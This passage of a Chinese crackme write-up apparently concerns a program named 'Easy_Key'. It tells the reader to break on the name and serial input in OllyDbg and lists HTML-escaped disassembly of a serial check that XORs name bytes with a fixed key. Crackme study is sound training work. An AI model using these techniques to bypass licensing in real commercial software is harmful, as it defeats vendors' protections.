&lt;p&gt;开OD跟着跑一下，下断点在InputName和InputSerial处，可以看到判定对错函数如下：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;00401000&lt;/span&gt;  &lt;span class="o"&gt;/$&lt;/span&gt;  &lt;span class="nt"&gt;81EC&lt;/span&gt; &lt;span class="nt"&gt;30010000&lt;/span&gt; &lt;span class="nt"&gt;sub&lt;/span&gt; &lt;span class="nt"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;130&lt;/span&gt;
&lt;span class="nt"&gt;00401006&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;55&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;ebp&lt;/span&gt;
&lt;span class="nt"&gt;00401007&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;56&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;esi&lt;/span&gt;
&lt;span class="nt"&gt;00401008&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;57&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;edi&lt;/span&gt;
&lt;span class="nt"&gt;00401009&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;B9&lt;/span&gt; &lt;span class="nt"&gt;18000000&lt;/span&gt;   &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;18&lt;/span&gt;
&lt;span class="nt"&gt;0040100E&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;33C0&lt;/span&gt;          &lt;span class="nt"&gt;xor&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;eax&lt;/span&gt;
&lt;span class="nt"&gt;00401010&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8D7C24&lt;/span&gt; &lt;span class="nt"&gt;11&lt;/span&gt;     &lt;span class="nt"&gt;lea&lt;/span&gt; &lt;span class="nt"&gt;edi&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;00401014&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;C64424&lt;/span&gt; &lt;span class="nt"&gt;10&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;  &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;byte&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;0&lt;/span&gt;
&lt;span class="nt"&gt;00401019&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;C64424&lt;/span&gt; &lt;span class="nt"&gt;74&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;  &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;byte&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;74&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;0&lt;/span&gt;
&lt;span class="nt"&gt;0040101E&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;F3&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;AB&lt;/span&gt;         &lt;span class="nt"&gt;rep&lt;/span&gt; &lt;span class="nt"&gt;stos&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;es&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;00401020&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;66&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;AB&lt;/span&gt;         &lt;span class="nt"&gt;stos&lt;/span&gt; &lt;span class="nt"&gt;word&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;es&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;00401022&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;AA&lt;/span&gt;            &lt;span class="nt"&gt;stos&lt;/span&gt; &lt;span class="nt"&gt;byte&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;es&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;00401023&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;B9&lt;/span&gt; &lt;span class="nt"&gt;31000000&lt;/span&gt;   &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;31&lt;/span&gt;
&lt;span class="nt"&gt;00401028&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;33C0&lt;/span&gt;          &lt;span class="nt"&gt;xor&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;eax&lt;/span&gt;
&lt;span class="nt"&gt;0040102A&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8D7C24&lt;/span&gt; &lt;span class="nt"&gt;75&lt;/span&gt;     &lt;span class="nt"&gt;lea&lt;/span&gt; &lt;span class="nt"&gt;edi&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;75&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;0040102E&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;68&lt;/span&gt; &lt;span class="nt"&gt;60804000&lt;/span&gt;   &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;Easy_Key&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;00408060&lt;/span&gt;                   &lt;span class="o"&gt;;&lt;/span&gt;  &lt;span class="nt"&gt;Input&lt;/span&gt; &lt;span class="nt"&gt;Name&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
&lt;span class="nt"&gt;00401033&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;F3&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;AB&lt;/span&gt;         &lt;span class="nt"&gt;rep&lt;/span&gt; &lt;span class="nt"&gt;stos&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;es&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;00401035&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;66&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;AB&lt;/span&gt;         &lt;span class="nt"&gt;stos&lt;/span&gt; &lt;span class="nt"&gt;word&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;es&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;00401037&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;AA&lt;/span&gt;            &lt;span class="nt"&gt;stos&lt;/span&gt; &lt;span class="nt"&gt;byte&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;es&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;00401038&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;C64424&lt;/span&gt; &lt;span class="nt"&gt;10&lt;/span&gt; &lt;span class="nt"&gt;10&lt;/span&gt;  &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;byte&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;10&lt;/span&gt;              &lt;span class="o"&gt;;&lt;/span&gt;  &lt;span class="nt"&gt;array&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;3&lt;/span&gt; &lt;span class="nt"&gt;bytes&lt;/span&gt;
&lt;span class="nt"&gt;0040103D&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;C64424&lt;/span&gt; &lt;span class="nt"&gt;11&lt;/span&gt; &lt;span class="nt"&gt;20&lt;/span&gt;  &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;byte&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;20&lt;/span&gt;
&lt;span class="nt"&gt;00401042&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;C64424&lt;/span&gt; &lt;span class="nt"&gt;12&lt;/span&gt; &lt;span class="nt"&gt;30&lt;/span&gt;  &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;byte&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;30&lt;/span&gt;
&lt;span class="nt"&gt;00401047&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;E8&lt;/span&gt; &lt;span class="nt"&gt;6D010000&lt;/span&gt;   &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="nt"&gt;Easy_Key&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;004011B9&lt;/span&gt;
&lt;span class="nt"&gt;0040104C&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;83C4&lt;/span&gt; &lt;span class="nt"&gt;04&lt;/span&gt;       &lt;span class="nt"&gt;add&lt;/span&gt; &lt;span class="nt"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;4&lt;/span&gt;
&lt;span class="nt"&gt;0040104F&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8D4424&lt;/span&gt; &lt;span class="nt"&gt;10&lt;/span&gt;     &lt;span class="nt"&gt;lea&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;00401053&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;50&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;
&lt;span class="nt"&gt;00401054&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;68&lt;/span&gt; &lt;span class="nt"&gt;5C804000&lt;/span&gt;   &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;Easy_Key&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0040805C&lt;/span&gt;                   &lt;span class="o"&gt;;&lt;/span&gt;  &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;s&lt;/span&gt;
&lt;span class="nt"&gt;00401059&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;E8&lt;/span&gt; &lt;span class="nt"&gt;44010000&lt;/span&gt;   &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="nt"&gt;Easy_Key&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;004011A2&lt;/span&gt;                   &lt;span class="o"&gt;;&lt;/span&gt;  &lt;span class="nt"&gt;input&lt;/span&gt; &lt;span class="nt"&gt;function&lt;/span&gt;
&lt;span class="nt"&gt;0040105E&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8D7C24&lt;/span&gt; &lt;span class="nt"&gt;18&lt;/span&gt;     &lt;span class="nt"&gt;lea&lt;/span&gt; &lt;span class="nt"&gt;edi&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;00401062&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;83C9&lt;/span&gt; &lt;span class="nt"&gt;FF&lt;/span&gt;       &lt;span class="nt"&gt;or&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;FFFFFFFF&lt;/span&gt;
&lt;span class="nt"&gt;00401065&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;33C0&lt;/span&gt;          &lt;span class="nt"&gt;xor&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;eax&lt;/span&gt;
&lt;span class="nt"&gt;00401067&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;83C4&lt;/span&gt; &lt;span class="nt"&gt;08&lt;/span&gt;       &lt;span class="nt"&gt;add&lt;/span&gt; &lt;span class="nt"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;8&lt;/span&gt;
&lt;span class="nt"&gt;0040106A&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;33ED&lt;/span&gt;          &lt;span class="nt"&gt;xor&lt;/span&gt; &lt;span class="nt"&gt;ebp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;ebp&lt;/span&gt;
&lt;span class="nt"&gt;0040106C&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;33F6&lt;/span&gt;          &lt;span class="nt"&gt;xor&lt;/span&gt; &lt;span class="nt"&gt;esi&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;esi&lt;/span&gt;
&lt;span class="nt"&gt;0040106E&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;F2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;AE&lt;/span&gt;         &lt;span class="nt"&gt;repne&lt;/span&gt; &lt;span class="nt"&gt;scas&lt;/span&gt; &lt;span class="nt"&gt;byte&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;es&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;00401070&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;F7D1&lt;/span&gt;          &lt;span class="nt"&gt;not&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;
&lt;span class="nt"&gt;00401072&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;49&lt;/span&gt;            &lt;span class="nt"&gt;dec&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;
&lt;span class="nt"&gt;00401073&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;85C9&lt;/span&gt;          &lt;span class="nt"&gt;test&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;ecx&lt;/span&gt;
&lt;span class="nt"&gt;00401075&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;7E&lt;/span&gt; &lt;span class="nt"&gt;3F&lt;/span&gt;         &lt;span class="nt"&gt;jle&lt;/span&gt; &lt;span class="nt"&gt;short&lt;/span&gt; &lt;span class="nt"&gt;Easy_Key&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;004010B6&lt;/span&gt;
&lt;span class="nt"&gt;00401077&lt;/span&gt;  &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt;  &lt;span class="nt"&gt;83FE&lt;/span&gt; &lt;span class="nt"&gt;03&lt;/span&gt;       &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;cmp&lt;/span&gt; &lt;span class="nt"&gt;esi&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;3&lt;/span&gt;
&lt;span class="nt"&gt;0040107A&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;7C&lt;/span&gt; &lt;span class="nt"&gt;02&lt;/span&gt;         &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;jl&lt;/span&gt; &lt;span class="nt"&gt;short&lt;/span&gt; &lt;span class="nt"&gt;Easy_Key&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0040107E&lt;/span&gt;
&lt;span class="nt"&gt;0040107C&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;33F6&lt;/span&gt;          &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;xor&lt;/span&gt; &lt;span class="nt"&gt;esi&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;esi&lt;/span&gt;
&lt;span class="nt"&gt;0040107E&lt;/span&gt;  &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt;  &lt;span class="nt"&gt;0FBE4C34&lt;/span&gt; &lt;span class="nt"&gt;0C&lt;/span&gt;   &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;movsx&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;byte&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;esi&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;C&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;00401083&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;0FBE542C&lt;/span&gt; &lt;span class="nt"&gt;10&lt;/span&gt;   &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;movsx&lt;/span&gt; &lt;span class="nt"&gt;edx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;byte&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;ebp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;00401088&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;33CA&lt;/span&gt;          &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;xor&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;edx&lt;/span&gt;
&lt;span class="nt"&gt;0040108A&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8D4424&lt;/span&gt; &lt;span class="nt"&gt;74&lt;/span&gt;     &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;lea&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;74&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;0040108E&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;51&lt;/span&gt;            &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;
&lt;span class="nt"&gt;0040108F&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;50&lt;/span&gt;            &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;
&lt;span class="nt"&gt;00401090&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8D4C24&lt;/span&gt; &lt;span class="nt"&gt;7C&lt;/span&gt;     &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;lea&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="nx"&gt;C&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;00401094&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;68&lt;/span&gt; &lt;span class="nt"&gt;54804000&lt;/span&gt;   &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;Easy_Key&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;00408054&lt;/span&gt;                  &lt;span class="o"&gt;;&lt;/span&gt;  &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;s&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;02X&lt;/span&gt;
&lt;span class="nt"&gt;00401099&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;51&lt;/span&gt;            &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;
&lt;span class="nt"&gt;0040109A&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;E8&lt;/span&gt; &lt;span class="nt"&gt;B1000000&lt;/span&gt;   &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="nt"&gt;Easy_Key&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;00401150&lt;/span&gt;
